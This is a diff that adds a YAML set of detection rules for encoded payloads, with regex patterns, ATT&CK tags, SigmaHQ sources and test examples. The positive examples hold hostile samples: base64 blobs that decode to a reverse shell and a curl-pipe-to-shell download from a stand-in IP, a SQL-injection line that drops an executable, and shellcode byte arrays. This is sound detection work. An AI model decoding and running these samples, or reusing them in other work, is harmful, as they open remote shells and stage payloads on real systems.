@@ -1,0 +1,489 @@
+# Mention patterns for encoded payloads in raw text: PowerShell -EncodedCommand blobs, base64 forms of known
+# malicious content (including the three byte alignments Sigma's base64offset modifier produces), base64 and hex
+# executable headers, shellcode prologues, and decode-then-execute shapes. Base64 and hex fragments are matched
+# case-sensitively, because case is part of the encoding.
+#
+# A long encoded run with no surrounding context (for example any 256-character base64 string) cannot be expressed
+# in this schema: every anchored pattern needs a literal prefix. Each blob entry here therefore pairs the run with the
+# context that consumes it (-enc, echo ... | base64 -d), and the length thresholds are stated per entry.
+
+- id: mention.encoded_powershell_encodedcommand
+  title: 'powershell.exe -EncodedCommand with a blob of 40 or more base64 characters'
+  match:
+    anchored: 'powershell(?:\.exe)?["'']?[^\n]{0,120} -(?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand) {1,3}["'']?[A-Za-z0-9+/]{40,1000}'
+  case_sensitive: false
+  strength: medium
+  attack: [T1059.001, T1027.010]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Encoded PowerShell Command Line (Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_base64_encoded_cmd.yml
+    license: DRL-1.1
+    upstream_id: ca2092a1-c273-4878-9b4b-0d60115bf5ea
+  rationale: >-
+    Any accepted abbreviation of -EncodedCommand followed by a base64 blob. 40 characters decode to 15 UTF-16
+    characters, about the shortest useful command, so shorter values are not treated as a payload. Configuration
+    management agents (SCCM, Intune, some RMM tools, the VS Code PowerShell host) also pass encoded commands, so the
+    shape alone is medium; the decoded content decides.
+  examples:
+    positive:
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA'
+      - 'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'
+    negative:
+      - 'powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Corp\inventory.ps1'
+      - 'powershell -e cGluZw=='
+
+- id: mention.encoded_pwsh_encodedcommand
+  title: 'pwsh -EncodedCommand with a blob of 40 or more base64 characters'
+  match:
+    anchored: 'pwsh(?:\.exe)?["'']?[^\n]{0,120} -(?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand) {1,3}["'']?[A-Za-z0-9+/]{40,1000}'
+  case_sensitive: false
+  strength: medium
+  attack: [T1059.001, T1027.010]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Encoded PowerShell Command Line (Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_base64_encoded_cmd.yml
+    license: DRL-1.1
+    upstream_id: ca2092a1-c273-4878-9b4b-0d60115bf5ea
+  rationale: >-
+    The PowerShell 7 binary (Windows and Linux) with the same encoded-command shape and threshold as the
+    powershell.exe entry; management tooling uses it too, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 12:00:00 lnx01 bash[700]: HISTORY: pwsh -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'
+    negative:
+      - 'Nov 20 12:00:01 lnx01 bash[701]: HISTORY: pwsh -File ./build.ps1 -Configuration Release'
+      - 'Nov 20 12:00:02 lnx01 bash[702]: HISTORY: pwsh -ExecutionPolicy Bypass -c Get-Date'
+
+- id: mention.encoded_powershell_b64_iex
+  title: UTF-16 base64 of 'IEX (' or 'iex (New' as PowerShell encodes it
+  match:
+    literal:
+      - 'SQBFAFgAIAAoAFsA'
+      - 'kARQBYACAAKABbA'
+      - 'JAEUAWAAgACgAWw'
+      - 'aQBlAHgAIAAoAFsA'
+      - 'kAZQB4ACAAKABbA'
+      - 'pAGUAeAAgACgAWw'
+      - 'aQBlAHgAIAAoAE4AZQB3A'
+      - 'kAZQB4ACAAKABOAGUAdw'
+      - 'pAGUAeAAgACgATgBlAHcA'
+      - 'SQBFAFgAIAAoAE4AZQB3A'
+      - 'kARQBYACAAKABOAGUAdw'
+      - 'JAEUAWAAgACgATgBlAHcA'
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.001, T1027.010]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell Base64 Encoded IEX Cmdlet (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_base64_iex.yml
+    license: DRL-1.1
+    upstream_id: 88f680b8-070e-402c-ae11-d2914f2257f1
+  rationale: >-
+    The three byte alignments of 'IEX ([' and 'iex (New' in UTF-16LE base64, the form PowerShell's -EncodedCommand
+    takes. An encoded command that itself invokes Invoke-Expression on a constructed object is the layered cradle of
+    Empire, Cobalt Strike and commodity loaders; management tools encode plain scripts, not iex wrappers.
+  examples:
+    positive:
+      - 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0ASQBFAFgAIAAoAFsAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AkARQBYACAAKABbAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AJAEUAWAAgACgAWwACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AaQBlAHgAIAAoAFsAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AkAZQB4ACAAKABbAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0ApAGUAeAAgACgAWwACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AaQBlAHgAIAAoAE4AZQB3AACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AkAZQB4ACAAKABOAGUAdwACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0ApAGUAeAAgACgATgBlAHcAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AkARQBYACAAKABOAGUAdwACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AJAEUAWAAgACgATgBlAHcAACkA'
+    negative:
+      - 'powershell -enc RwBlAHQALQBEAGEAdABlAA=='
+      - 'Nov 20 12:01:30 web01 app[700]: blob=VwByAGkAdABlAC0ASABvAHMAdAAgAGgAZQBsAGwAbwA='
+
+- id: mention.encoded_powershell_b64_reflection_load
+  title: UTF-16 base64 of [Reflection.Assembly]::Load(
+  match:
+    literal:
+      - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'
+      - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'
+      - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'
+      - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC'
+      - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp'
+      - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK'
+      - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ'
+      - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA'
+      - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA'
+      - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'
+      - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'
+      - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'
+  case_sensitive: true
+  strength: strong
+  attack: [T1620, T1027.010]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell Base64 Encoded Reflective Assembly Load (Christian Burkard, pH-T, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_base64_reflection_assembly_load.yml
+    license: DRL-1.1
+    upstream_id: 62b7ccc9-23b4-471e-aa15-6da3663c4d59
+  rationale: >-
+    Encoded commands that load a .NET assembly from memory are how in-memory tooling (Rubeus, SharpHound, Cobalt
+    Strike execute-assembly look-alikes) is run without touching disk. The rule rates false positives as unlikely.
+  examples:
+    positive:
+      - 'powershell -enc WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AbAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AAFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0ABbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AAWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AbAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoAACkA'
+    negative:
+      - 'powershell -enc RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=='
+      - 'powershell -c "[Reflection.Assembly]::LoadWithPartialName(''System.Windows.Forms'')"'
+
+- id: mention.encoded_base64_pe_header
+  title: Base64 of a Windows executable header
+  match:
+    literal: ['TVqQAAMAAAAEAAAA', 'TVpQAAIAAAAEAA8A', 'TVqAAAEAAAAEABAA', 'TVoAAAAAAAAAAAAA', 'TVpTAQEAAAAEAAAA']
+  case_sensitive: true
+  strength: strong
+  attack: [T1027.013, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Base64 MZ Header In CommandLine (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_susp_inline_base64_mz_header.yml
+    license: DRL-1.1
+    upstream_id: 22e58743-4ac8-4a9f-bf19-00a0428d8c5f
+  rationale: >-
+    The base64 encodings of common PE ('MZ') headers. A Windows executable carried inline as text in a command line,
+    script or web request is a payload being smuggled; the rule rates false positives as unlikely.
+  examples:
+    positive:
+      - 'powershell -c "[IO.File]::WriteAllBytes(''C:\Users\Public\a.exe'',[Convert]::FromBase64String(''TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAA''))"'
+      - 'powershell -c "[IO.File]::WriteAllBytes(''a.exe'',[Convert]::FromBase64String(''TVpQAAIAAAAEAA8AAAAA''))"'
+      - 'powershell -c "[IO.File]::WriteAllBytes(''a.exe'',[Convert]::FromBase64String(''TVqAAAEAAAAEABAAAAAA''))"'
+      - 'powershell -c "[IO.File]::WriteAllBytes(''a.exe'',[Convert]::FromBase64String(''TVoAAAAAAAAAAAAAAAAA''))"'
+      - 'powershell -c "[IO.File]::WriteAllBytes(''a.exe'',[Convert]::FromBase64String(''TVpTAQEAAAAEAAAAAAAA''))"'
+    negative:
+      - 'powershell -c "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(''hello''))"'
+      - 'Nov 20 12:01:00 web01 app[700]: token=TVRJek5EVTJOemc1TUE9PQ'
+
+- id: mention.encoded_hex_pe_header
+  title: Hex of a Windows executable header
+  match:
+    literal: ['4d5a90000300000004000000ffff']
+  case_sensitive: false
+  strength: strong
+  attack: [T1027.013, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Base64 MZ Header In CommandLine (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_susp_inline_base64_mz_header.yml
+    license: DRL-1.1
+    upstream_id: 22e58743-4ac8-4a9f-bf19-00a0428d8c5f
+  rationale: >-
+    The hex form of the same standard PE header the rule matches in base64 ('MZ', 0x90, page count 3, header size 4,
+    max memory 0xffff). Hex-encoded executables are passed through SQL injection (0x4d5a... literals), certutil
+    -decodehex and PowerShell byte strings; benign logs do not carry raw PE headers.
+  examples:
+    positive:
+      - '203.0.113.60 - - [20/Nov/2026:12:02:00 +0000] "GET /item.php?id=1;SELECT 0x4d5a90000300000004000000ffff0000b8 INTO DUMPFILE ''C:/inetpub/wwwroot/a.exe'' HTTP/1.1" 500 0 "-" "-"'
+    negative:
+      - 'Nov 20 12:02:01 web01 app[700]: sha256=4d5a3e2f9c0b7d1a00e3c1b2f4a5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7'
+      - 'Nov 20 12:02:02 web01 kernel: [ 1.0] pci 0000:00:1f.3: [8086:4d5a] type 00 class 0x040300'
+
+- id: mention.encoded_elf_header_encoded
+  title: Base64 or hex of a Linux ELF header
+  match:
+    literal: ['f0VMRgIBAQ', 'f0VMRgEBAQ', '7f454c4602010100', '7f454c4601010100']
+  case_sensitive: true
+  strength: medium
+  attack: [T1027.013, T1105]
+  telemetry: [any]
+  source:
+    name: Linux man-pages project, elf(5)
+    url: https://man7.org/linux/man-pages/man5/elf.5.html
+    license: Linux man-pages VERBATIM license
+    upstream_id: elf(5)
+  rationale: >-
+    The ELF magic (0x7f 'E' 'L' 'F') followed by class (32/64-bit), little-endian data and version 1, in base64 and
+    lowercase hex. A Linux executable carried as text is a payload in transit (echo | base64 -d > file droppers, SQL
+    injection, IoT loaders). Container and package tooling rarely logs binaries inline, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 12:03:00 cam01 sh[300]: echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAA | base64 -d > /tmp/.k'
+    negative:
+      - 'Nov 20 12:03:01 web01 app[700]: session=f0VMR2xhc3NpZmllZA'
+      - 'Nov 20 12:03:02 web01 kernel: [ 2.0] Loaded X.509 cert ''Build time autogenerated kernel key: 7f454c46aa01'''
+
+- id: mention.encoded_shellcode_prologue_b64
+  title: Base64 of the Metasploit x86 block_api shellcode prologue
+  match:
+    literal: ['OiCAAAAYInlM', 'OiJAAAAYInlM']
+  case_sensitive: true
+  strength: strong
+  attack: [T1055, T1027.013]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell ShellCode (David Ledbetter, Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_script/posh_ps_shellcode_b64.yml
+    license: DRL-1.1
+    upstream_id: 16b37b70-6fcf-4814-a092-c36bd3aafcbd
+  rationale: >-
+    These decode to 'call +0x82/+0x89; pusha; mov ebp, esp', the start of the API-hashing stub used by Metasploit and
+    Cobalt Strike x86 stagers. Embedded in a script or request it is shellcode; it has no benign text form.
+  examples:
+    positive:
+      - '$s=[Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItK")'
+      - '$buf=[Convert]::FromBase64String("/OiJAAAAYInlMMAAAAMAAAA")'
+    negative:
+      - '$s=[Convert]::FromBase64String("SGVsbG8gV29ybGQ=")'
+      - 'Nov 20 12:04:00 web01 app[700]: cache-key=OiCAAAAX9pQ1'
+
+- id: mention.encoded_shellcode_prologue_hex
+  title: Hex text of the Metasploit x86 block_api shellcode prologue
+  match:
+    literal:
+      - '\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5'
+      - '\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5'
+      - '0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5'
+      - '0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5'
+  case_sensitive: false
+  strength: strong
+  attack: [T1055, T1027.013]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell ShellCode (David Ledbetter, Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_script/posh_ps_shellcode_b64.yml
+    license: DRL-1.1
+    upstream_id: 16b37b70-6fcf-4814-a092-c36bd3aafcbd
+  rationale: >-
+    The same prologue bytes the rule matches in base64 (cld; call; pusha; mov ebp, esp), written the way msfvenom's
+    C, Python and PowerShell output formats print them. Shellcode in a log line is an injection or loader payload.
+  examples:
+    positive:
+      - '[Byte[]] $buf = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30'
+      - 'buf = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"'
+      - 'buf = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"'
+      - '[Byte[]] $buf = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64'
+    negative:
+      - '[Byte[]] $key = 0x01,0x02,0x03,0x04,0x05'
+      - 'buf = b"\x48\x65\x6c\x6c\x6f"'
+
+- id: mention.encoded_frombase64string
+  title: .NET FromBase64String call
+  match:
+    literal: ['::FromBase64String(']
+  case_sensitive: false
+  strength: medium
+  attack: [T1140, T1027.010]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Base64 Encoded PowerShell Command Detected (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_frombase64string.yml
+    license: DRL-1.1
+    upstream_id: e32d4572-9826-4738-b651-95fa63747e8a
+  rationale: >-
+    Decoding base64 inside a PowerShell command line is how staged payloads unpack themselves. Administrative script
+    libraries decode certificates and configuration the same way (the rule's own false positive), so it is medium.
+  examples:
+    positive:
+      - 'powershell -c "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''d2hvYW1p'')))"'
+    negative:
+      - 'powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(''C:\certs\a.cer''))"'
+      - 'powershell -c "Get-Content C:\data\b64.txt | Measure-Object"'
+
+- id: mention.encoded_frombase64_gzip
+  title: FromBase64String on a gzip blob
+  match:
+    anchored: 'FromBase64String\( {0,2}["'']H4sI'
+  case_sensitive: false
+  strength: medium
+  attack: [T1140, T1027.015]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious FromBase64String Usage On Gzip Archive - Process Creation (frack113)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_frombase64string_archive.yml
+    license: DRL-1.1
+    upstream_id: d75d6b6b-adb9-48f7-824b-ac2e786efe1f
+  rationale: >-
+    The rule needs FromBase64String, MemoryStream and the gzip-in-base64 marker 'H4sI'; the payload literal directly
+    inside the call is the common order. Compressed-then-encoded inline scripts are typical of Metasploit and Cobalt
+    Strike PowerShell stagers; some legitimate scripts embed resources the same way, so it is medium as upstream.
+  examples:
+    positive:
+      - 'powershell -c "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAAAAAAAEAL1XbW''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"'
+    negative:
+      - 'powershell -c "[Convert]::FromBase64String($cert)"'
+      - 'Nov 20 12:05:00 k8s01 helm[700]: release payload H4sIAAAAAAAC/6RU stored'
+
+- id: mention.encoded_base64_decode_to_shell
+  title: 'base64 -d with a pipe into a shell'
+  match:
+    anchored: 'base64 {1,3}(?:-d|--decode|-di|-D)[^|\n]{0,40}\| {0,3}(?:sudo )?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
+  case_sensitive: true
+  strength: medium
+  attack: [T1140, T1059.004, T1027.010]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Linux Base64 Encoded Pipe to Shell (pH-T, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_base64_execution.yml
+    license: DRL-1.1
+    upstream_id: ba592c6d-6888-43c3-b8c6-689b8fe47337
+  rationale: >-
+    Decoding base64 straight into a shell hides the real command from anyone reading the line; cryptominer and botnet
+    loaders do it constantly. Some provisioning tools ship scripts the same way, so it is medium as upstream.
+  examples:
+    positive:
+      - 'Nov 20 12:06:00 web01 bash[700]: HISTORY: echo Y3VybCAtcyBodHRwOi8vMjAzLjAuMTEzLjcveC5zaCB8IHNo | base64 -d | bash'
+    negative:
+      - 'Nov 20 12:06:01 web01 bash[701]: HISTORY: kubectl get secret db -o jsonpath={.data.password} | base64 -d'
+      - 'Nov 20 12:06:02 web01 bash[702]: HISTORY: base64 -d cert.b64 > cert.der'
+
+- id: mention.encoded_echo_blob_base64_decode
+  title: echo of a base64 blob of 40 or more characters into a decoder
+  match:
+    anchored: 'echo {1,3}["'']?[A-Za-z0-9+/]{40,1000}={0,2}["'']? {0,3}\| {0,3}base64 {1,3}(?:-d|--decode|-di|-D)'
+  case_sensitive: true
+  strength: medium
+  attack: [T1140, T1027.010]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Decode Base64 Encoded Text (Daniil Yugoslavskiy, oscd.community)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_base64_decode.yml
+    license: DRL-1.1
+    upstream_id: e2072cab-8c9a-459b-b63c-40ae79e27031
+  rationale: >-
+    Narrows the low-level rule to an inline blob of at least 40 base64 characters (30 bytes, long enough to hold a
+    command or a binary chunk). Typing an encoded payload into a decoder is a staging step; developers occasionally
+    decode test values, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 12:07:00 web01 bash[703]: HISTORY: echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuNy80NDQ0IDA+JjE=" | base64 -d > /tmp/r.sh'
+    negative:
+      - 'Nov 20 12:07:01 web01 bash[704]: HISTORY: echo "aGVsbG8=" | base64 -d'
+      - 'Nov 20 12:07:02 web01 bash[705]: HISTORY: echo hello | base64'
+
+- id: mention.encoded_base64_shebang
+  title: Base64 of a shell script shebang
+  match:
+    literal: ['IyEvYmluL2Jhc2', 'IyEvYmluL2Rhc2', 'IyEvYmluL3pza', 'IyEvYmluL2Zpc2', 'IyEvYmluL3No']
+  case_sensitive: true
+  strength: weak
+  attack: [T1027.010, T1059.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Linux Base64 Encoded Shebang In CLI (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml
+    license: DRL-1.1
+    upstream_id: fe2f9663-41cb-47e2-b954-8a228f3b9dff
+  rationale: >-
+    A whole shell script carried in base64. Cloud-init user data and Kubernetes manifests carry base64 scripts
+    routinely, so it is a weak candidate; what the script does decides.
+  examples:
+    positive:
+      - 'Nov 20 12:08:00 web01 bash[706]: HISTORY: echo IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vMjAzLjAuMTEzLjcveHwgc2gK | base64 -d > /tmp/u.sh'
+    negative:
+      - 'Nov 20 12:08:01 web01 bash[707]: HISTORY: echo IyBjb21tZW50 | base64 -d'
+      - 'Nov 20 12:08:02 web01 cloud-init[612]: Cloud-init v. 24.1 finished at Wed, 20 Nov 2026'
+
+- id: mention.encoded_reverse_shell_base64
+  title: Base64 of interactive-shell socket redirections at any byte alignment
+  match:
+    literal:
+      - 'YmFzaCAtaSA+JiAvZGV2L'
+      - 'Jhc2ggLWkgPiYgL2Rldi'
+      - 'iYXNoIC1pID4mIC9kZXYv'
+      - 'c2ggLWkgPiYgL2Rldi'
+      - 'NoIC1pID4mIC9kZXYv'
+      - 'zaCAtaSA+JiAvZGV2L'
+      - 'L2Jpbi9zaCAtaSAyPiYx'
+      - '9iaW4vc2ggLWkgMj4mM'
+      - 'vYmluL3NoIC1pIDI+Jj'
+  case_sensitive: true
+  strength: strong
+  attack: [T1027.010, T1059.004]
+  telemetry: [any]
+  source:
+    name: Sigma specification, base64offset modifier, applied to reverse-shell strings from the revshells.com catalog
+    url: https://sigmahq.io/sigma-specification/specification/sigma-modifiers-appendix.html
+    license: 'not applicable: method reference; the encoded strings are computed from public reverse-shell text'
+    upstream_id: null
+  rationale: >-
+    'bash -i >& /dev/', 'sh -i >& /dev/' and '/bin/sh -i 2>&1' encoded at each of the three byte alignments (the
+    base64offset construction: encode after 0, 1 or 2 leading bytes and keep only characters fully determined by
+    the string). Each fragment still pins at least 'h -i >& /dev' or 'bin/sh -i 2>&', the interactive-shell
+    redirection of a reverse shell hidden in base64 (echo ... | base64 -d | bash, Java deserialization payloads).
+    Fragments ending in a bare '-' were dropped because they also match ordinary shebangs such as
+    '#!/bin/bash -ex'. Random base64 data contains an 18-character fragment by chance with negligible probability.
+  examples:
+    positive:
